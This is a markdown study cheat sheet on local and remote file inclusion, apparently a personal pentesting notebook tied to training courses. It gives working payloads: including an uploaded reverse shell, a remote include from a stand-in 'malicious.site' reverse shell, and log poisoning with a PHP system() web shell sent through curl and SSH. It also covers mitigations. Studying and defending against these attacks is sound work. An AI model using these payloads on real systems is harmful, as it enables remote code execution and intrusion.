# File inclusion

[![fileinc](../../../../_badges/thmp/fileinc.svg)](https://tryhackme.com/room/fileinc)
[![fileinclusion](../../../../../cybersecurity/_badges/htb/fileinclusion.svg)](https://academy.hackthebox.com/course/preview/file-inclusion)

<div class="row row-cols-lg-2"><div>

Files inclusion refers to websites that are importing a file based or using the user input. This involves using the user input to:

* ğŸš determine configuration files to include
* ğŸŒ determine language files to include
* ...

If the input is not filtered/validated, a hacker may include arbitrary content using [Path traversal](traversal.md) such as an uploaded script.
</div><div>

There are two categories of file inclusion

* **Local File Inclusion (LFI)** ğŸ : include a local file
* **Remote File Inclusion (RFI)** âœˆï¸: include a remote file

Template engines are more likely to contain LFI/RFI. They can lead to code/data exposure, which may further compromise the company.

âš ï¸ For RFI, always try a local URL that is likely not blocked by a firewall first <small>(ex: `http://127.0.0.1:80/index.php`)</small>. Alternatively, you may try `ftp://` or `\\IP\share\` on Windows.
</div></div>

<hr class="sep-both">

## Basic Methodology

<div class="row row-cols-lg-2"><div>

Assuming you found some vectors that might lead to a LFI, such as:

* ğŸ“š Headers
* ğŸ“„ Forms
* ğŸª Cookies
* ...

You might try to play around with the value to see if it works.
</div><div>

Assuming we have `page=about`.

* Test Path `./about`
* Test Null-Byte `./about.php%00`
* Test a Path `../<folder name>/about`
* Test Architecture-specific payloads, such as `php://filter`
* Test Remote Inclusion
* ...
</div></div>

<hr class="sep-both">

## PHP File Inclusion

<div class="row row-cols-lg-2"><div>

The website `http://vulnerable.site/?lang=FR` is doing an include using `$_GET["lang"]` as seen below.

```php!
include "lang/$_GET[lang].php"
```

We can use [Path traversal](traversal.md) or [PHP Wrappers](files/wrappers.md) to include a malicious file, such as one we uploaded using another attack.

**Local File Inclusion (LFI)** ğŸ : inject a local file

```php!
// ex: we uploaded a reverse shell (a fake PNG)
// as our avatar (avatar.png), then we could use:
include "lang/../uploads/avatar.png"
```
</div><div>

**Remote File Inclusion (RFI)** âœˆï¸: inject a remote file

```php!
// ğŸ›‘ allow_url_fopen MUST BE SET TO true
include "http://malicious.site/reverse_shell.php"
```

**Additional notes**:

* The **null byte `%00`** could be used in **PHP < 5.3.4** to ignore trailing extensions such as `.png` below:

```php!
include "xxx.png%00.php" // include xxx.png
```

* The PHP string truncation could be used in **PHP < 5.3.0** as strings longer than 4096 were truncated.
</div></div>

<hr class="sep-both">

## Log Poisoning

<div class="row row-cols-lg-2"><div>

If the vulnerable function can execute code, we may not have to upload a webshell, we can inject PHP code in the logs and read the logs to execute the injected code.

Note that logs must be readable by the web application. Nginx logs are readable by anyone, but not Apache logs.

```ps
# Ex: load /var/log/apache2/access.log / ...
$ curl [...] -A "<?php system(\$_GET['cmd']); ?>"
```

ğŸ‘‰ `/proc/self/environ` or `/proc/self/fd/<0-50>` will contains the User-Agent too, but they may not be readable either.
</div><div>

We can alternatively poison ssh logs <small>(username)</small>, ftp logs, etc.

```ps
$ ssh '<?php /*code*/ ?>'@IP # Ex: /var/log/auth.log
```

#### PHP Sessions

If the session contains a value that we control, we can inject PHP code in this value, then we can read the session file.

* `/var/lib/php/sessions/sess_<session id>`
* `C:\Windows\Temp\sess_<session id>`
</div></div>

<hr class="sep-both">

## File Inclusion Mitigation ğŸ›¡ï¸

<div class="row row-cols-lg-2"><div>

* ğŸª² Do not use *user-controlled input to include a file, whether the input is from the database or from a form.

* ğŸ«§ Use whitelists <small>(switch-case value to file, maps, etc.)</small>, and avoid directly using user-controlled input

* ğŸ•¸ï¸ If allowing paths, refer to path traversal mitigations
</div><div>

* ğŸ”’ Use docker or a similar technology to isolate the application OR lock web applications to their web root directory. In PHP, we can set the `open_basedir` variable in the PHP INI file. Beware that configuration files will still be accessible.

* ğŸ”« Use additional verifications such as using `realpath` in path to ensure the files are within the allowed directories

* ğŸ“š Use additional tools such as a WAF, etc.
</div></div>

<hr class="sep-both">

## ğŸ‘» To-do ğŸ‘»

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* `/var/log/sshd.log`
* `/var/log/vsftpd.log`
</div><div>

* [LFISuite](https://github.com/D35m0nd142/LFISuite) <small>(1.5k â­, 2018 ğŸª¦)</small>
* [LFiFreak](https://github.com/OsandaMalith/LFiFreak) <small>(0.2k â­, 2015 ğŸª¦)</small>
* [liffy](https://github.com/mzfr/liffy) <small>(0.7k â­)</small>
</div></div>